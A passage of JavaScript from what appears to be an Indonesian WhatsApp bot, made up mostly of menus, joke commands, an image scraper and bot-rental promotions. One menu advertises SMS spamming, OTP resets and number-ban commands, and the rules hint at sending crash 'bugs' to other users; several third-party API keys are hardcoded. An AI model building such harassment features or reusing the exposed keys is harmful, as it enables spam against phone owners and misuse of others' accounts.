rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break

// SOUND MENU
case 'soundmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Sound\` 
│
│•⟢ ${prefix}sound1
│•⟢ ${prefix}sound161
│
│#ketik sound 1 sampai 161 
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
// GROUP MENU
case 'groupmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Grup\` 
│
│•⟢ ${prefix}pushkontak *text*
│•⟢ ${prefix}bcgroup *text*
│•⟢ ${prefix}hidetag *text*
│•⟢ ${prefix}editsubjek *text*
│•⟢ ${prefix}editdesk *text*
│•⟢ ${prefix}inspect *link gc*
│•⟢ ${prefix}add *62xxx*
│•⟢ ${prefix}kick *62xxx*
│•⟢ ${prefix}promote *62xxx*
│•⟢ ${prefix}demote *62xxx*
│•⟢ ${prefix}linkgroup
│•⟢ ${prefix}resetlinkgc
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
// RXHL MENU
case 'sepesialmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Sepesial\` 
│
│•⟢ ${prefix}resetotp *62xx*
│•⟢ ${prefix}unbanned *62xx*
│•⟢ ${prefix}unbannedv2 *62xx*
│•⟢ ${prefix}unbannedv3 *62xx*
│•⟢ ${prefix}spamsms *62xx*
│•⟢ ${prefix}nowa *62xx*
│
꒰⚘݄꒱₊___________________˓˓

╭୧⍤⃝─•◦❥•◦   \`List Fitur Tools\` 
│
│•⟢ ${prefix}style *teks*
│•⟢ ${prefix}fliptext *teks*
│•⟢ ${prefix}tourl *reply media*
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
// STICKER MENU
case 'stickermenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Sticker\` 
│
│•⟢ ${prefix}attp *text*
│•⟢ ${prefix}sticker
│•⟢ ${prefix}smeme
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
//
case 'aimenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Ai\` 
│
│•⟢ ${prefix}nulis
│•⟢ ${prefix}pinterest <query>
│•⟢ ${prefix}
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
//
case 'funmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Fun\` 
│
│•⟢ ${prefix}apakah 
│•⟢ ${prefix}bisakah
│•⟢ ${prefix}bagaimanakah
│•⟢ ${prefix}rate
│•⟢ ${prefix}gantengcek
│•⟢ ${prefix}cantikcek
│•⟢ ${prefix}sangecek
│•⟢ ${prefix}kapankah
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
//
case 'editormenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Editor\` 
│
│•⟢ ${prefix}hd
│•⟢ ${prefix}removebg
│•⟢ ${prefix}ssweb
│•⟢ ${prefix}logoneko
│•⟢ ${prefix}sertifikattolol
│•⟢ ${prefix}tiktokslide
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
// DOWNLOAD MENU
case 'downloadmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Download\` 
│
│•⟢ ${prefix}tiktokmp4 *link*
│•⟢ ${prefix}tiktokmp3 *link*
│•⟢ ${prefix}ytmp3 *link*
│•⟢ ${prefix}startytmp3 *judul*
│•⟢ ${prefix}yts *judul*
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
//Quotes menu
case 'quotesmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`Quotes Menu\` 
│
│•⟢ ${prefix}quotesbacot
│•⟢ ${prefix}quotesbucin 
│•⟢ ${prefix}quotesmotivasi
│•⟢ ${prefix}quotesgalau
│•⟢ ${prefix}quotesgombal
│•⟢ ${prefix}quoteshacker
│•⟢ ${prefix}quotesbijak
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
// ASUPAN MENU
case 'asupanmenu':
await loading()
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson': "{'title':'CyberdarkBOT OFC','sections':[{'title':'Pilihan Premium!','highlight_label':'Berbayar','rows':[{'header':'','title':'BOT VIP BY Ellen OFC','description':'Telegram: @mrellen','id':'.kontplbinatang'}]}]}"
              },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "My Channel",
      url: "https://youtube.com/@mrellen",
      merchant_url: "https://youtube.com/@mrellen"
   })
}
]
ewe = `
╭୧⍤⃝─•◦❥•◦   \`List Fitur Asupan\` 
│
│•⟢ ${prefix}tiktokgirl 
│•⟢ ${prefix}tiktoknukthy 
│•⟢ ${prefix}tiktokkayes
│•⟢ ${prefix}tiktokpanrika
│•⟢ ${prefix}tiktoknotnot
│•⟢ ${prefix}tiktokghea
│•⟢ ${prefix}tiktoksantuy
│•⟢ ${prefix}paptt
│
꒰⚘݄꒱₊___________________˓˓`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `EllenOfficial`
})
break
//
case 'cuaca':
if (!isCreator) return reply(global.nocreator)
if (!q) throw reply `_Contoh_\n${prefix+command} bandung`
let api_cuaca = '18d044eb8e1c06eaf7c5a27bb138694c'
let unit_cuaca = 'metric'
let nama_kota = q
let cuaca = await fetchJson(`http://api.openweathermap.org/data/2.5/weather?q=${nama_kota}&units=${unit_cuaca}&appid=${api_cuaca}`)
let text_cuaca =`*INFO CUACA*

*Nama:* ${cuaca.name + "," + cuaca.sys.country}
*Longitude:* ${cuaca.coord.lon}
*Latitude:* ${cuaca.coord.lat}
*Suhu:* ${cuaca.main.temp + " C"}
*Angin:* ${cuaca.wind.speed + " m/s"}
*Kelembaban:* ${cuaca.main.humidity + "%"}
*Cuaca:* ${cuaca.weather[0].main}
*Keterangan:* ${cuaca.weather[0].description}
*Udara:* ${cuaca.main.pressure + " HPa"}`
reply(text_cuaca)
break
//
case 'runtime': {
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await rxhl.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ctext(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break
//—————「 fun MENU 」—————//
case 'apakah': {
if (!text) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
reply(mess.wait)
await sleep(500)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
replyy(`Pertanyaan : Apakah ${text}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!text) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
reply(mess.wait)
await sleep(500)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
replyy(`Pertanyaan : Apakah ${text}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': {
if (!text) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
reply(mess.wait)
await sleep(500)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
replyy(`Pertanyaan : Apakah ${text}\nJawaban : ${ya}`)
}
break
case 'rate': {
if (!text) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
reply(mess.wait)
await sleep(500)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
replyy(`Rating : ${text}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Senchini`)
reply(mess.wait)
await sleep(500)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
replyy(`Nama : ${text}\nJawaban : *${teng}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
reply(mess.wait)
await sleep(500)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
replyy(`Nama : ${text}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!text) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
reply(mess.wait)
await sleep(500)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
replyy(`Nama : ${text}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!text) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
reply(mess.wait)
await sleep(500)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
replyy(`Pertanyaan : ${text}\nJawaban : *${kapankah}*`)
}
break
//fitur ai
case 'pinterest': 
case 'pinter': 
case 'pin': {
  if (!text) return replyz(`• *Example:* ${prefix + command} kuro servamp`);
  
  await replyz(mess.wait);
  
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: rxhl.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }
  
  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);
  
  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;
  
  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }
  
  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});
  
  await rxhl.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
}

break

//

//
case 'nulis': {
				replyz(`*Example*\n${prefix}nuliskiri <text>\n${prefix}nuliskanan <text>\n${prefix}foliokiri <text>\n${prefix}foliokanan <text>`)
			}
			break
			case 'nuliskiri': {
				if (!text) return replyz(`Kirim perintah *${prefix + command}* Teksnya`)
				replyz(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/nulis/images/buku/sebelumkiri.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./src/nulis/images/buku/setelahkiri.jpg'
				])
				.on('error', () => replyz(mess.error))
				.on('exit', () => {
					rxhl.sendMessage(m.chat, { image: fs.readFileSync('./src/nulis/images/buku/setelahkiri.jpg'), caption: 'Jangan Malas Lord, Masa Depan Itu Milik Orang Yang Percaya Dengan Mimpinya Dan Bekerja Sepenuh Hati Untuk Mewujudkannya 😊' }, { quoted: m })
				})
			}
			break
			case 'nuliskanan': {
				if (!text) return replyz(`Kirim perintah *${prefix + command}* Teksnya`)
				replyz(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./src/nulis/images/buku/sebelumkanan.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+128+129',
					fixHeight,
					'./src/nulis/images/buku/setelahkanan.jpg'
				])
				.on('error', () => replyz(mess.error))
				.on('exit', () => {
					rxhl.sendMessage(m.chat, { image: fs.readFileSync('./src/nulis/images/buku/setelahkanan.jpg'), caption: 'Jangan Malas Lord, Masa Depan Itu Milik Orang Yang Percaya Dengan Mimpinya Dan Bekerja Sepenuh Hati Untuk Mewujudkannya 😊' }, { quoted: m })
				})
			}
			break
			case 'foliokiri': {
				if (!text) return replyz(`Kirim perintah *${prefix + command}* Teksnya`)
				replyz(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/nulis/images/folio/sebelumkiri.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+48+185',
					fixHeight,
					'./src/nulis/images/folio/setelahkiri.jpg'
				])
				.on('error', () => replyz(mess.error))
				.on('exit', () => {
					rxhl.sendMessage(m.chat, { image: fs.readFileSync('./src/nulis/images/folio/setelahkiri.jpg'), caption: 'Jangan Malas Lord, Masa Depan Itu Milik Orang Yang Percaya Dengan Mimpinya Dan Bekerja Sepenuh Hati Untuk Mewujudkannya 😊' }, { quoted: m })
				})
			}
			break
			case 'foliokanan': {
				if (!text) return replyz(`Kirim perintah *${prefix + command}* Teksnya`)
				replyz(mess.wait)
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 38).join('\n')
				spawn('convert', [
					'./src/nulis/images/folio/sebelumkanan.jpg',
					'-font',
					'./src/nulis/font/Indie-Flower.ttf',
					'-size',
					'1720x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'4',
					'-annotate',
					'+89+190',
					fixHeight,
					'./src/nulis/images/folio/setelahkanan.jpg'
				])
				.on('error', () => replyz(mess.error))
				.on('exit', () => {
					rxhl.sendMessage(m.chat, { image: fs.readFileSync('./src/nulis/images/folio/setelahkanan.jpg'), caption: 'Jangan Malas Lord, Masa Depan Itu Milik Orang Yang Percaya Dengan Mimpinya Dan Bekerja Sepenuh Hati Untuk Mewujudkannya 😊' }, { quoted: m })
				})
			}
			break
//
case 'donasi':{
				  const cap = `◪ *DONASI*
  ├─ ❏ *OVO*
  ├─ ❏ *GOPAY* 
  ├─ ❏ *DANA*
  ├─ ❏ *QRIS*
  ├─ » _082274542640_
  
_TERIMAKASIH BAYAK YANG SUDAH MAU BERDONASI_`
					replyz(cap) }
					break
case 'buypremium':{
				  const cap = `*OPEN JASA SEWA BOT*

Sewa 2 Minggu : 10k
Sewa 3 Minggu : 15k
Sewa 1 Bulan    : 20k

*Payment :*
*_Ovo,Dana,Qris,Pulsa_*

Minat?PC
Wa.me/6282274542640`
					replyz(cap) }
					break
					///
					case 'rules':
case 'snk':{
				  const cap = `*Syarat & Ketentuan ${botname}*\n1. Teks dan nama pengguna WhatsApp anda kami simpan di dalam server selama bot aktif.\n2. Data anda akan di hapus ketika bot offline.\n3. Kami tidak menyimpan gambar, video, file, audio, dan dokumen yang anda kirim.\n4. Kami tidak pernah meminta anda untuk memberikan informasi pribadi.\n5. Jika menemukan Bug/Error silahkan langsung lapor ke Owner bot.\n6. Cukup perintah 1x jika bot tidak merespon harap ulangi kembali, Jika di ulangi kembali tidak merespon, Bot tidak aktif\n7. Dilarang spam, Share virus virtex, Telpon, Video call, Kami akan blockir anda.\n8. Apapun yang anda perintah pada bot ini, *KAMI TIDAK BERTANGGUNG JAWAB!*\n\nTERIMA KASIH !~`
					replyz(cap) }
					break
case 'ss':
case 'ssweb':{
if (!q) return replynano(`Mana linknya kak?`)
try {
rxhl.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/ssweb?type=mobile&url=${encodeURIComponent(text)}&apikey=nanogembul` }}, { quoted: m})
			} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
//=========================================\\

case 'sertifikattolol':
case 'sertiflol': {
  if (!q) return replynano(`Mana Nama Orangnya Kak`)
  reply(mess.wait)
  rxhl.sendMessage(m.chat, { image: { url: `https://kiicodeofficial.my.id/api/maker/tolol?text=${q}&apikey=${apikiicode}`
 }, caption: `_Ini Dia Sertifikat Nya Kak_` }, { quoted: m})
}
break
//=========================================\\
case 'logoneko':
case 'nekologo': {
  if (!q) return replynano(`Mana Nama Orangnya Kak`)
  reply(mess.wait)
  rxhl.sendMessage(m.chat, { image: { url: `https://api.caliph.biz.id/api/girlneko?nama=${q}&nama2=dev&apikey=CcVXxbMw`
 }, caption: `_Ini Dia Logo Nya Kak_` }, { quoted: m})
}
break
//======================================================================

case 'ttslide': case 'tiktokslide':{
if (!q) return replynano(`Use it by the way ${prefix+command} *url*\n\n_Example_\n\n${prefix+command} https://vt.tiktok.com/ZSL36LfEP/`)
rxhl.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
try{
let anu = await fetchJson(`https://aemt.me/download/tiktokslide?url=${text}`)
await rxhl.sendMessage(m.chat, { image: { url: anu.result.data.origin_cover}, caption: ``}, {quoted: m})
await rxhl.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
}catch (error) {
await rxhl.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
}
break
//
case 'removebg':
case 'nobg':
case 'hapusbackground':{
if (!quoted) return replynano(`mana Fotonya kak?`)
reply(mess.wait)
try {
const media = await rxhl.downloadAndSaveMediaMessage(quoted)
const anu = await TelegraPh (media)
rxhl.sendMessage(m.chat, { image: { url: `https://skizo.tech/api/removebg?apikey=nanogembul&url=${anu}` }, caption: `*Sukses menghapus background*\n${xtime}` }, { quoted: m})
	} catch {
	  reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
break
//
case 'hd':
  case 'remini':{
if (!quoted) return replynano(`Where is the picture?`)
			if (!/image/.test(mime)) return replynano(`Kirim/Balas Foto Dengan caption ${prefix + command}`)
			reply(mess.wait)
			try {
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			rxhl.sendMessage(m.chat, { image: proses, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
			} catch {
			  reply('yah eror kak')
			}
			}
			break
//
case 'rules': {
  const cap = `┏━━━━°❀ ❬ *Rules Bot MultiDevice* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

5. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

6. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

7. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

8. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
replyz(cap)
}
break
//truth
case 'truth':
              const truth =[
"Pernahkah kamu menyukai seseorang? Berapa lama?",
    "Jika kamu bisa atau jika kamu mau, grup obrolan atau grup di luar mana yang ingin kamu jadikan teman? (bisa berbeda/jenis yang sama)",
    "Apa ketakutan terbesar kamu?",
    "Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
    "Siapa nama mantan pacar temanmu yang dulu pernah kamu sukai diam-diam?",
    "Pernahkah kamu mengambil uang dari ayah atau ibumu? Alasannya?",
    "Apa yang membuatmu bahagia saat sedang sedih?",
    "Pernahkah kamu memiliki perasaan cinta satu arah? jika ya kepada siapa? bagaimana perasaannya, bro?",
    "Pernah menjadi selingkuhan seseorang?",
    "Hal paling ditakuti?",
    "Siapa orang yang paling berpengaruh dalam hidupmu?",
    "Prestasi apa yang berhasil kamu raih tahun ini?",
    "Siapa orang yang bisa membuatmu keren?",
    "Siapa orang yang pernah membuatmu sangat bahagia?",
    "Siapa yang paling mendekati tipe pasangan idamanmu di sini?",
    "Dengan siapa kamu suka bermain?",
    "Pernahkah kamu menolak seseorang? alasan mengapa?",
    "Sebutkan insiden yang pernah menyakiti perasaanmu yang masih kamu ingat",
    "Prestasi apa yang sudah kamu capai tahun ini?",
    "Kebiasaan terburukmu di sekolah?",
    "Lagu apa yang paling sering kamu nyanyikan di dalam kamar mandi?",
    "Pernahkah kamu mengalami pengalaman dekat dengan kematian?",
